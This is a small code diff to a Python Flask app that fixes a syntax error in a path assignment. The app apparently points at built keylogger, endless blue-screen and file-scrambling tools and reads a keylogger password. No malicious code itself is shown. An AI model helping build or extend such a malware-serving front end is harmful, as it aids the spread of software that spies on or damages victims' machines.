@@ -9,7 +9,7 @@ KEY_LOGGER_PASSWORD=os.environ.get("KEY_LOGGER_PASSWORD")
 
 ENDLESS_BSOD_path = os.path.join("..", "ENDLESS_BSOD", "dist")
 FileScrambler_path = os.path.join("..", "FileScrambler", "dist")
-KEY_LOGGER_PATH=os.path.join("..","KEY_LOGGER","dist")")
+KEY_LOGGER_PATH=os.path.join("..","KEY_LOGGER","dist")
 
 @app.route("/", methods=["GET", "POST"])
 def home():
